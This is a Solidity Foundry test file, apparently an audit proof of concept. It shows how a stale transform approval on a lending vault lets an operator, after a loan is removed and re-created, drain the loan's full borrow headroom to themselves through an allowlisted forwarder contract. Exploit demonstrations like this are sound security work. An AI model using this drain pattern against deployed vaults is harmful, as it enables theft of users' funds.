// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {V4VaultLocalBase} from "test/vault/support/V4VaultLocalBase.sol";
import {IVault} from "src/vault/interfaces/IVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/// @notice Drain transformer: allowlisted, operator-chosen recipient. Forwards the
///      full transform-mode borrow headroom to the recipient. Models V4Utils.execute
///      with instructions.recipient = attacker (repo flagship transformer, intended
///      to be allowlisted): the vault calls it mid-transform, it pulls value via
///      the vault itself, sends to the operator-chosen address.
contract DrainForwarder {
    IVault internal vault;

    constructor(IVault v) {
        vault = v;
    }

    function drain(uint256 tokenId, uint256 amount, address recipient) external {
        vault.borrow(tokenId, amount);
        IERC20 reclaim = IERC20(vault.asset());
        reclaim.transfer(recipient, reclaim.balanceOf(address(this)));
    }

    fallback() external {}
}

/// @notice F1 IMPACT UPGRADE (theft, not grief): stale approveTransform across
///      remove/re-create confers the code's own documented full value-extraction
///      authority (V4Vault transform L662-668, M-3 accepted). Operator with NO fresh
///      approval drains the recreated debt-free loan's full borrow headroom to
///      themselves through transform() end-health.
/// Run: forge test --match-contract StaleDrainPoC -vvv
contract StaleDrainPoC is V4VaultLocalBase {
    DrainForwarder internal drainer;
    address internal operator = makeAddr("operator");

    function setUp() public override {
        super.setUp();
        drainer = new DrainForwarder(IVault(address(vault)));
        vault.setTransformer(address(drainer), true);
        _deposit(lender, 1_000_000 ether);
    }

    function test_staleApprovalDrainsFullHeadroom() public {
        uint256 tokenId = _createLoan(1e12);

        // borrower approves operator, then removes the debt-free loan
        vm.prank(borrower);
        vault.approveTransform(tokenId, operator, true);
        vm.prank(borrower);
        vault.remove(tokenId, borrower, "");

        // NFT back with borrower; re-create the SAME tokenId as the same owner
        vm.startPrank(borrower);
        IERC721(address(positionManager)).approve(address(vault), tokenId);
        vault.create(tokenId, borrower);
        vm.stopPrank();

        // stale operator drains the full headroom to themselves, no fresh approval.
        // amount mirrors the handler's headroom formula (collateral - debt, 1% margin,
        // capped by vault balance): raw max would revert on the collateral check.
        uint256 opBalBefore = asset.balanceOf(operator);
        (uint256 debtBefore,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
        (,, uint256 balance,,,) = vault.vaultInfo();
        uint256 headroom = (collateralValue - debtBefore) * 99 / 100;
        uint256 amount = headroom < balance ? headroom : balance;
        vm.prank(operator);
        try vault.transform(
            tokenId, address(drainer), abi.encodeWithSelector(drainer.drain.selector, tokenId, amount, operator)
        ) {
            uint256 taken = asset.balanceOf(operator) - opBalBefore;
            (uint256 debt,,,,) = vault.loanInfo(tokenId);
            // THEFT: operator took ~full headroom; victim loan absorbed the debt
            assertGt(taken, 0.5 ether, "stale approval drained nothing");
            assertGt(debt, 0.5 ether, "victim loan did not absorb the drain");
        } catch {
            assertTrue(false, "track killed: stale transform reverted");
        }
    }
}
